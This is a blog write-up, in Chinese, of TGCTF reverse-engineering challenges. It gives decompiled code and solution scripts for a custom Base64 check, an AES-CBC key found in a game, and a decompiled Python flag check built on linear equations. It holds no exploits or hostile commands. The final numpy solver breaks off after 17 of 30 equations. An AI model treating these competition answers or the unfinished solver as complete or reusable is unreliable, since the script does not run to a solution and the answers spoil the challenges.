---
title: TGCTF PWN&Reverse WP
date: '2025-04-12 19:32:58'
updated: '2025-05-27 22:00:22'
---
## Reverse
### Base64
IDA 看 main 函数

main 函数这里的 strcmp 对比的是密文

![](/images/6f473d4ef8022f8d54157862406199e7.png)

对比之前的加密函数里面看到了 base64，但是表不一样

```python
_BYTE *__fastcall sub_1400010E0(__int64 a1)
{
  __int64 v2; // rbx
  __int64 v3; // rbp
  int v4; // edx
  int v5; // edi
  int v6; // edx
  __int64 v7; // r14
  size_t v8; // rcx
  _BYTE *v9; // r8
  __int64 v10; // r9
  unsigned __int64 v11; // rdx
  int v12; // ecx
  unsigned int v13; // ecx
  unsigned int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // edi
  __int64 v19; // rdx
  int v20; // eax
  int v21; // eax
  int v22; // ecx
  unsigned int v23; // edx
  int v24; // ecx
  int v25; // eax
  int v26; // ecx
  unsigned int v27; // ecx
  unsigned int v28; // eax
  char v30[80]; // [rsp+20h] [rbp-68h] BYREF
  int v31; // [rsp+90h] [rbp+8h]

  v2 = -1LL;
  strcpy(v30, "GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI");
  do
    ++v2;
  while ( *(_BYTE *)(a1 + v2) );
  v3 = 0LL;
  v4 = (int)v2 / 3;
  if ( (_DWORD)v2 == 3 * ((int)v2 / 3) )
  {
    v5 = 0;
    v6 = 4 * v4;
  }
  else if ( (int)v2 % 3 == 1 )
  {
    v5 = 1;
    v6 = 4 * v4 + 4;
  }
  else if ( (int)v2 % 3 == 2 )
  {
    v5 = 2;
    v6 = 4 * v4 + 4;
  }
  else
  {
    v5 = v31;
    v6 = v31;
  }
  v7 = v6;
  v8 = v6 + 1LL;
  if ( v6 == -1LL )
    v8 = -1LL;
  v9 = malloc(v8);
  if ( (int)v2 - v5 > 0 )
  {
    v10 = a1 + 2;
    v11 = ((int)v2 - v5 - 1LL) / 3uLL + 1;
    do
    {
      v3 += 4LL;
      v12 = *(unsigned __int8 *)(v10 - 2) >> 2;
      v10 += 3LL;
      v13 = v12 + 24;
      v14 = v13 - 64;
      if ( v13 <= 0x40 )
        v14 = v13;
      v9[v3 - 4] = v30[v14];
      v15 = ((*(unsigned __int8 *)(v10 - 4) >> 4) | (16 * (*(_BYTE *)(v10 - 5) & 3))) - 40;
      if ( ((*(unsigned __int8 *)(v10 - 4) >> 4) | (16 * (*(_BYTE *)(v10 - 5) & 3u))) + 24 <= 0x40 )
        v15 = ((*(unsigned __int8 *)(v10 - 4) >> 4) | (16 * (*(_BYTE *)(v10 - 5) & 3))) + 24;
      v9[v3 - 3] = v30[v15];
      v16 = ((*(unsigned __int8 *)(v10 - 3) >> 6) | (4 * (*(_BYTE *)(v10 - 4) & 0xF))) - 40;
      if ( ((*(unsigned __int8 *)(v10 - 3) >> 6) | (4 * (*(_BYTE *)(v10 - 4) & 0xFu))) + 24 <= 0x40 )
        v16 = ((*(unsigned __int8 *)(v10 - 3) >> 6) | (4 * (*(_BYTE *)(v10 - 4) & 0xF))) + 24;
      v9[v3 - 2] = v30[v16];
      v17 = (*(_BYTE *)(v10 - 3) & 0x3F) - 40;
      if ( (*(_BYTE *)(v10 - 3) & 0x3Fu) + 24 <= 0x40 )
        v17 = (*(_BYTE *)(v10 - 3) & 0x3F) + 24;
      v9[v3 - 1] = v30[v17];
      --v11;
    }
    while ( v11 );
  }
  v18 = v5 - 1;
  if ( !v18 )
  {
    v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) >> 2) - 40;
    if ( (*(unsigned __int8 *)((int)v2 + a1 - 1) >> 2) + 24 <= 0x40u )
      v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) >> 2) + 24;
    v9[v7 - 4] = v30[v25];
    v26 = *(_BYTE *)((int)v2 + a1 - 1) & 3;
    *(_WORD *)&v9[v7 - 2] = 15677;
    v27 = 16 * v26 + 24;
    v28 = v27 - 64;
    if ( v27 <= 0x40 )
      v28 = v27;
    v9[v7 - 3] = v30[v28];
    goto LABEL_37;
  }
  if ( v18 != 1 )
  {
LABEL_37:
    v9[v7] = 0;
    return v9;
  }
  v19 = a1 + (int)v2;
  v20 = (*(unsigned __int8 *)(v19 - 2) >> 2) - 40;
  if ( (*(unsigned __int8 *)(v19 - 2) >> 2) + 24 <= 0x40u )
    v20 = (*(unsigned __int8 *)(v19 - 2) >> 2) + 24;
  v9[v7 - 4] = v30[v20];
  v21 = ((*(unsigned __int8 *)(v19 - 1) >> 4) | (16 * (*(_BYTE *)(v19 - 2) & 3))) - 40;
  if ( ((*(unsigned __int8 *)(v19 - 1) >> 4) | (16 * (*(_BYTE *)(v19 - 2) & 3u))) + 24 <= 0x40 )
    v21 = ((*(unsigned __int8 *)(v19 - 1) >> 4) | (16 * (*(_BYTE *)(v19 - 2) & 3))) + 24;
  v9[v7 - 3] = v30[v21];
  v22 = *(_BYTE *)(v19 - 1) & 0xF;
  *(_WORD *)&v9[v7 - 1] = 61;
  v23 = 4 * v22 + 24;
  v24 = 4 * v22 - 40;
  if ( v23 <= 0x40 )
    v24 = v23;
  v9[v7 - 2] = v30[v24];
  return v9;
}
```

exp：

```python
#!/usr/bin/env python3

CUSTOM_ALPHABET = ("GLp/+Wn7""uqX8FQ2J""DR1c0M6U""53sjBwyx""glmr""CVdS""ThAf""EOvP""HaYZ""Nzo4""ktK9""iebI")

rev_map = {}
for j, ch in enumerate(CUSTOM_ALPHABET):
    if j >= 24:
        rev_map[ch] = j - 24
    else:
        rev_map[ch] = j + 40

def decode_custom_base64(encoded_str):
    encoded_str = encoded_str.strip()
    padding = encoded_str.count('=')
    encoded_str = encoded_str.rstrip('=')
    six_bit_values = []
    for ch in encoded_str:
        if ch not in rev_map:
            raise ValueError(f"Illegal character in input: {ch}")
        six_bit_values.append(rev_map[ch])
    decoded_bytes = bytearray()
    for i in range(0, len(six_bit_values), 4):
        chunk = six_bit_values[i:i+4]
        while len(chunk) < 4:
            chunk.append(0)
        bits24 = (chunk[0] << 18) | (chunk[1] << 12) | (chunk[2] << 6) | chunk[3]
        decoded_bytes.append((bits24 >> 16) & 0xFF)
        decoded_bytes.append((bits24 >> 8) & 0xFF)
        decoded_bytes.append(bits24 & 0xFF)
    if padding:
        decoded_bytes = decoded_bytes[:-padding]
    return bytes(decoded_bytes)

encoded_data = "AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF="
decoded_data = decode_custom_base64(encoded_data)
print("Decoded_data:", decoded_data)
```

![](/images/1a681f40de7b45df20ec49411c98d2ce.png)

### 水果忍者
![](/images/91d53a2e3ae0a4ca9a3287b38ad4d170.png)

还有前面有加密用的函数

```python
private static readonly string encryptionKey = "HZNUHZNUHZNUHZNU";
private static readonly string iv = "0202005503081501";
private static readonly string encryptedHexData = "cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaaf";
private string Decrypt(byte[] cipherText, string key, string iv)
{
	string result;
	using (Aes aes = Aes.Create())
	{
		aes.Key = Encoding.UTF8.GetBytes(key);
		aes.IV = Encoding.UTF8.GetBytes(iv);
		aes.Mode = CipherMode.CBC;
		aes.Padding = PaddingMode.PKCS7;
		ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
		using (MemoryStream memoryStream = new MemoryStream(cipherText))
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
			{
				using (StreamReader streamReader = new StreamReader(cryptoStream))
				{
					result = streamReader.ReadToEnd();
				}
			}
		}
	}
	return result;
}
```

使用 AES：CBC 

其中encryptionKey和iv 都是 ascii，encryptedHexData为hex

![](/images/b4ab1d7500c598e391fbe2bf758541e0.png)

### 蛇年的本命语言
先用 pyinsatller 反编译 exe 文件，得到.pyc 文件，然后再用 uncompyle6 获得 python 代码：

```python
# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.12.5 (tags/v3.12.5:ff3bc82, Aug  6 2024, 20:45:27) [MSC v.1940 64 bit (AMD64)]
# Embedded file name: output.py
from collections import Counter
print("Welcome to HZNUCTF!!!")
print("Plz input the flag:")
ooo0oOoooOOO0 = input()
oOO0OoOoo000 = Counter(ooo0oOoooOOO0)
O0o00 = "".join((str(oOO0OoOoo000[oOooo0OOO]) for oOooo0OOO in ))
print("ans1: ", end="")
print(O0o00)
if O0o00 != "111111116257645365477364777645752361":
    print("wrong_wrong!!!")
    exit(1)
iiIII = ""
for oOooo0OOO in ooo0oOoooOOO0:
    if oOO0OoOoo000[oOooo0OOO] > 0:
        iiIII += oOooo0OOO + str(oOO0OoOoo000[oOooo0OOO])
        oOO0OoOoo000[oOooo0OOO] = 0
    else:
        i11i1Iii1I1 = [ord(oOooo0OOO) for oOooo0OOO in iiIII]
        ii1iIi1i11i = [
         7 * i11i1Iii1I1[0] == 504,
         9 * i11i1Iii1I1[0] - 5 * i11i1Iii1I1[1] == 403,
         2 * i11i1Iii1I1[0] - 5 * i11i1Iii1I1[1] + 10 * i11i1Iii1I1[2] == 799,
         3 * i11i1Iii1I1[0] + 8 * i11i1Iii1I1[1] + 15 * i11i1Iii1I1[2] + 20 * i11i1Iii1I1[3] == 2938,
         5 * i11i1Iii1I1[0] + 15 * i11i1Iii1I1[1] + 20 * i11i1Iii1I1[2] - 19 * i11i1Iii1I1[3] + 1 * i11i1Iii1I1[4] == 2042,
         7 * i11i1Iii1I1[0] + 1 * i11i1Iii1I1[1] + 9 * i11i1Iii1I1[2] - 11 * i11i1Iii1I1[3] + 2 * i11i1Iii1I1[4] + 5 * i11i1Iii1I1[5] == 1225,
         11 * i11i1Iii1I1[0] + 22 * i11i1Iii1I1[1] + 33 * i11i1Iii1I1[2] + 44 * i11i1Iii1I1[3] + 55 * i11i1Iii1I1[4] + 66 * i11i1Iii1I1[5] - 77 * i11i1Iii1I1[6] == 7975,
         21 * i11i1Iii1I1[0] + 23 * i11i1Iii1I1[1] + 3 * i11i1Iii1I1[2] + 24 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 6 * i11i1Iii1I1[5] - 7 * i11i1Iii1I1[6] + 15 * i11i1Iii1I1[7] == 229,
         2 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] + 13 * i11i1Iii1I1[2] + 0 * i11i1Iii1I1[3] - 65 * i11i1Iii1I1[4] + 15 * i11i1Iii1I1[5] + 29 * i11i1Iii1I1[6] + 1 * i11i1Iii1I1[7] + 20 * i11i1Iii1I1[8] == 2107,
         10 * i11i1Iii1I1[0] + 7 * i11i1Iii1I1[1] + -9 * i11i1Iii1I1[2] + 6 * i11i1Iii1I1[3] + 7 * i11i1Iii1I1[4] + 1 * i11i1Iii1I1[5] + 22 * i11i1Iii1I1[6] + 21 * i11i1Iii1I1[7] - 22 * i11i1Iii1I1[8] + 30 * i11i1Iii1I1[9] == 4037,
         15 * i11i1Iii1I1[0] + 59 * i11i1Iii1I1[1] + 56 * i11i1Iii1I1[2] + 66 * i11i1Iii1I1[3] + 7 * i11i1Iii1I1[4] + 1 * i11i1Iii1I1[5] - 122 * i11i1Iii1I1[6] + 21 * i11i1Iii1I1[7] + 32 * i11i1Iii1I1[8] + 3 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] == 4950,
         13 * i11i1Iii1I1[0] + 66 * i11i1Iii1I1[1] + 29 * i11i1Iii1I1[2] + 39 * i11i1Iii1I1[3] - 33 * i11i1Iii1I1[4] + 13 * i11i1Iii1I1[5] - 2 * i11i1Iii1I1[6] + 42 * i11i1Iii1I1[7] + 62 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] + 11 * i11i1Iii1I1[11] == 12544,
         23 * i11i1Iii1I1[0] + 6 * i11i1Iii1I1[1] + 29 * i11i1Iii1I1[2] + 3 * i11i1Iii1I1[3] - 3 * i11i1Iii1I1[4] + 63 * i11i1Iii1I1[5] - 25 * i11i1Iii1I1[6] + 2 * i11i1Iii1I1[7] + 32 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] + 11 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] == 6585,
         223 * i11i1Iii1I1[0] + 6 * i11i1Iii1I1[1] - 29 * i11i1Iii1I1[2] - 53 * i11i1Iii1I1[3] - 3 * i11i1Iii1I1[4] + 3 * i11i1Iii1I1[5] - 65 * i11i1Iii1I1[6] + 0 * i11i1Iii1I1[7] + 36 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 15 * i11i1Iii1I1[10] + 16 * i11i1Iii1I1[11] - 18 * i11i1Iii1I1[12] + 13 * i11i1Iii1I1[13] == 6893,
         29 * i11i1Iii1I1[0] + 13 * i11i1Iii1I1[1] - 9 * i11i1Iii1I1[2] - 93 * i11i1Iii1I1[3] + 33 * i11i1Iii1I1[4] + 6 * i11i1Iii1I1[5] + 65 * i11i1Iii1I1[6] + 1 * i11i1Iii1I1[7] - 36 * i11i1Iii1I1[8] + 0 * i11i1Iii1I1[9] - 16 * i11i1Iii1I1[10] + 96 * i11i1Iii1I1[11] - 68 * i11i1Iii1I1[12] + 33 * i11i1Iii1I1[13] - 14 * i11i1Iii1I1[14] == 1883,
         69 * i11i1Iii1I1[0] + 77 * i11i1Iii1I1[1] - 93 * i11i1Iii1I1[2] - 12 * i11i1Iii1I1[3] + 0 * i11i1Iii1I1[4] + 0 * i11i1Iii1I1[5] + 1 * i11i1Iii1I1[6] + 16 * i11i1Iii1I1[7] + 36 * i11i1Iii1I1[8] + 6 * i11i1Iii1I1[9] + 19 * i11i1Iii1I1[10] + 66 * i11i1Iii1I1[11] - 8 * i11i1Iii1I1[12] + 38 * i11i1Iii1I1[13] - 16 * i11i1Iii1I1[14] + 15 * i11i1Iii1I1[15] == 8257,
         23 * i11i1Iii1I1[0] + 2 * i11i1Iii1I1[1] - 3 * i11i1Iii1I1[2] - 11 * i11i1Iii1I1[3] + 12 * i11i1Iii1I1[4] + 24 * i11i1Iii1I1[5] + 1 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] + 14 * i11i1Iii1I1[8] - 0 * i11i1Iii1I1[9] + 1 * i11i1Iii1I1[10] + 68 * i11i1Iii1I1[11] - 18 * i11i1Iii1I1[12] + 68 * i11i1Iii1I1[13] - 26 * i11i1Iii1I1[14] + 15 * i11i1Iii1I1[15] - 16 * i11i1Iii1I1[16] == 5847,
         24 * i11i1Iii1I1[0] + 0 * i11i1Iii1I1[1] - 1 * i11i1Iii1I1[2] - 15 * i11i1Iii1I1[3] + 13 * i11i1Iii1I1[4] + 4 * i11i1Iii1I1[5] + 16 * i11i1Iii1I1[6] + 67 * i11i1Iii1I1[7] + 146 * i11i1Iii1I1[8] - 50 * i11i1Iii1I1[9] + 16 * i11i1Iii1I1[10] + 6 * i11i1Iii1I1[11] - 1 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 27 * i11i1Iii1I1[14] + 45 * i11i1Iii1I1[15] - 6 * i11i1Iii1I1[16] + 17 * i11i1Iii1I1[17] == 18257,
         25 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] - 89 * i11i1Iii1I1[2] + 16 * i11i1Iii1I1[3] + 19 * i11i1Iii1I1[4] + 44 * i11i1Iii1I1[5] + 36 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 150 * i11i1Iii1I1[8] - 250 * i11i1Iii1I1[9] + 166 * i11i1Iii1I1[10] + 126 * i11i1Iii1I1[11] - 11 * i11i1Iii1I1[12] + 690 * i11i1Iii1I1[13] - 207 * i11i1Iii1I1[14] + 46 * i11i1Iii1I1[15] + 6 * i11i1Iii1I1[16] + 7 * i11i1Iii1I1[17] - 18 * i11i1Iii1I1[18] == 12591,
         5 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] + 8 * i11i1Iii1I1[2] + 160 * i11i1Iii1I1[3] + 9 * i11i1Iii1I1[4] - 4 * i11i1Iii1I1[5] + 36 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] - 15 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 66 * i11i1Iii1I1[10] + 16 * i11i1Iii1I1[11] - 1 * i11i1Iii1I1[12] + 690 * i11i1Iii1I1[13] - 20 * i11i1Iii1I1[14] + 46 * i11i1Iii1I1[15] + 6 * i11i1Iii1I1[16] + 7 * i11i1Iii1I1[17] - 18 * i11i1Iii1I1[18] + 19 * i11i1Iii1I1[19] == 52041,
         29 * i11i1Iii1I1[0] - 26 * i11i1Iii1I1[1] + 0 * i11i1Iii1I1[2] + 60 * i11i1Iii1I1[3] + 90 * i11i1Iii1I1[4] - 4 * i11i1Iii1I1[5] + 6 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] - 16 * i11i1Iii1I1[8] - 21 * i11i1Iii1I1[9] + 69 * i11i1Iii1I1[10] + 6 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 20 * i11i1Iii1I1[14] - 46 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] - 1 * i11i1Iii1I1[18] + 39 * i11i1Iii1I1[19] - 20 * i11i1Iii1I1[20] == 20253,
         45 * i11i1Iii1I1[0] - 56 * i11i1Iii1I1[1] + 10 * i11i1Iii1I1[2] + 650 * i11i1Iii1I1[3] - 900 * i11i1Iii1I1[4] + 44 * i11i1Iii1I1[5] + 66 * i11i1Iii1I1[6] - 6 * i11i1Iii1I1[7] - 6 * i11i1Iii1I1[8] - 21 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 6 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 2 * i11i1Iii1I1[14] - 406 * i11i1Iii1I1[15] + 651 * i11i1Iii1I1[16] + 2 * i11i1Iii1I1[17] - 10 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] - 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] == 18768,
         555 * i11i1Iii1I1[0] - 6666 * i11i1Iii1I1[1] + 70 * i11i1Iii1I1[2] + 510 * i11i1Iii1I1[3] - 90 * i11i1Iii1I1[4] + 499 * i11i1Iii1I1[5] + 66 * i11i1Iii1I1[6] - 66 * i11i1Iii1I1[7] - 610 * i11i1Iii1I1[8] - 221 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 23 * i11i1Iii1I1[11] - 102 * i11i1Iii1I1[12] + 6 * i11i1Iii1I1[13] + 2050 * i11i1Iii1I1[14] - 406 * i11i1Iii1I1[15] + 665 * i11i1Iii1I1[16] + 333 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 777 * i11i1Iii1I1[20] + 201 * i11i1Iii1I1[21] - 22 * i11i1Iii1I1[22] == 111844,
         1 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4444 * i11i1Iii1I1[3] - 5555 * i11i1Iii1I1[4] + 6666 * i11i1Iii1I1[5] - 666 * i11i1Iii1I1[6] + 676 * i11i1Iii1I1[7] - 660 * i11i1Iii1I1[8] - 22 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 73 * i11i1Iii1I1[11] - 107 * i11i1Iii1I1[12] + 6 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] - 6 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 39 * i11i1Iii1I1[17] + 10 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] + 777 * i11i1Iii1I1[20] + 201 * i11i1Iii1I1[21] - 2 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] == 159029,
         520 * i11i1Iii1I1[0] - 222 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 56655 * i11i1Iii1I1[4] + 6666 * i11i1Iii1I1[5] + 666 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 73 * i11i1Iii1I1[11] + 1007 * i11i1Iii1I1[12] + 7777 * i11i1Iii1I1[13] + 2500 * i11i1Iii1I1[14] + 6666 * i11i1Iii1I1[15] + 605 * i11i1Iii1I1[16] + 390 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 99999 * i11i1Iii1I1[20] + 210 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] == 2762025,
         1323 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 666 * i11i1Iii1I1[5] + 666 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 660 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 100 * i11i1Iii1I1[12] + 777 * i11i1Iii1I1[13] + 2500 * i11i1Iii1I1[14] + 6666 * i11i1Iii1I1[15] + 605 * i11i1Iii1I1[16] + 390 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 9999 * i11i1Iii1I1[20] + 210 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] == 1551621,
         777 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 6969 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 666 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 100 * i11i1Iii1I1[12] + 777 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 90 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 999 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] == 948348,
         97 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 6969 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 56 * i11i1Iii1I1[4] + 96 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 90 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 2 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] == 777044,
         177 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 699 * i11i1Iii1I1[2] + 64 * i11i1Iii1I1[3] - 56 * i11i1Iii1I1[4] - 96 * i11i1Iii1I1[5] - 66 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 222 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 224 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] - 28 * i11i1Iii1I1[28] == 185016,
         77 * i11i1Iii1I1[0] - 2 * i11i1Iii1I1[1] + 6 * i11i1Iii1I1[2] + 6 * i11i1Iii1I1[3] - 96 * i11i1Iii1I1[4] - 9 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 0 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 9 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 222 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 224 * i11i1Iii1I1[24] + 26 * i11i1Iii1I1[25] - -58 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] - 2 * i11i1Iii1I1[28] + 29 * i11i1Iii1I1[29] == 130106]
        if all(ii1iIi1i11i):
            print("Congratulation!!!")
        else:
            print("wrong_wrong!!!")
```

脚本解方程：

```python
import numpy as np
n = 30
A = np.zeros((n, n), dtype=float)
b = np.zeros(n, dtype=float)

A[0, 0] = 7
b[0] = 504
A[1, 0] = 9; A[1, 1] = -5
b[1] = 403
A[2, 0] = 2; A[2, 1] = -5; A[2, 2] = 10
b[2] = 799
A[3, 0] = 3; A[3, 1] = 8; A[3, 2] = 15; A[3, 3] = 20
b[3] = 2938
A[4, 0] = 5; A[4, 1] = 15; A[4, 2] = 20; A[4, 3] = -19; A[4, 4] = 1
b[4] = 2042
A[5, 0] = 7; A[5, 1] = 1; A[5, 2] = 9; A[5, 3] = -11; A[5, 4] = 2; A[5, 5] = 5
b[5] = 1225
A[6, 0] = 11; A[6, 1] = 22; A[6, 2] = 33; A[6, 3] = 44; A[6, 4] = 55; A[6, 5] = 66; A[6, 6] = -77
b[6] = 7975
A[7, 0] = 21; A[7, 1] = 23; A[7, 2] = 3; A[7, 3] = 24; A[7, 4] = -55; A[7, 5] = 6; A[7, 6] = -7; A[7, 7] = 15
b[7] = 229
A[8, 0] = 2; A[8, 1] = 26; A[8, 2] = 13; A[8, 3] = 0; A[8, 4] = -65; A[8, 5] = 15; A[8, 6] = 29; A[8, 7] = 1; A[8, 8] = 20
b[8] = 2107
A[9, 0] = 10; A[9, 1] = 7; A[9, 2] = -9; A[9, 3] = 6; A[9, 4] = 7; A[9, 5] = 1; A[9, 6] = 22; A[9, 7] = 21; A[9, 8] = -22; A[9, 9] = 30
b[9] = 4037
A[10, 0] = 15; A[10, 1] = 59; A[10, 2] = 56; A[10, 3] = 66; A[10, 4] = 7; A[10, 5] = 1; A[10, 6] = -122; A[10, 7] = 21; A[10, 8] = 32; A[10, 9] = 3; A[10, 10] = -10
b[10] = 4950
A[11, 0] = 13; A[11, 1] = 66; A[11, 2] = 29; A[11, 3] = 39; A[11, 4] = -33; A[11, 5] = 13; A[11, 6] = -2; A[11, 7] = 42; A[11, 8] = 62; A[11, 9] = 1; A[11, 10] = -10; A[11, 11] = 11
b[11] = 12544
A[12, 0] = 23; A[12, 1] = 6; A[12, 2] = 29; A[12, 3] = 3; A[12, 4] = -3; A[12, 5] = 63; A[12, 6] = -25; A[12, 7] = 2; A[12, 8] = 32; A[12, 9] = 1; A[12, 10] = -10; A[12, 11] = 11; A[12, 12] = -12
b[12] = 6585
A[13, 0] = 223; A[13, 1] = 6; A[13, 2] = -29; A[13, 3] = -53; A[13, 4] = -3; A[13, 5] = 3; A[13, 6] = -65; A[13, 7] = 0; A[13, 8] = 36; A[13, 9] = 1; A[13, 10] = -15; A[13, 11] = 16; A[13, 12] = -18; A[13, 13] = 13
b[13] = 6893
A[14, 0] = 29; A[14, 1] = 13; A[14, 2] = -9; A[14, 3] = -93; A[14, 4] = 33; A[14, 5] = 6; A[14, 6] = 65; A[14, 7] = 1; A[14, 8] = -36; A[14, 9] = 0; A[14, 10] = -16; A[14, 11] = 96; A[14, 12] = -68; A[14, 13] = 33; A[14, 14] = -14
b[14] = 1883
A[15, 0] = 69; A[15, 1] = 77; A[15, 2] = -93; A[15, 3] = -12; A[15, 4] = 0; A[15, 5] = 0; A[15, 6] = 1; A[15, 7] = 16; A[15, 8] = 36; A[15, 9] = 6; A[15, 10] = 19; A[15, 11] = 66; A[15, 12] = -8; A[15, 13] = 38; A[15, 14] = -16; A[15, 15] = 15
b[15] = 8257
A[16, 0] = 23; A[16, 1] = 2; A[16, 2] = -3; A[16, 3] = -11; A[16, 4] = 12; A[16, 5] = 24; A[16, 6] = 1; A[16, 7] = 6; A[16, 8] = 14; A[16, 9] = 0; A[16, 10] = 1; A[16, 11] = 68; A[16, 12] = -18; A[16, 13] = 68; A[16, 14] = -26; A[16, 15] = 15; A[16, 16] = -16
b[16] = 5847
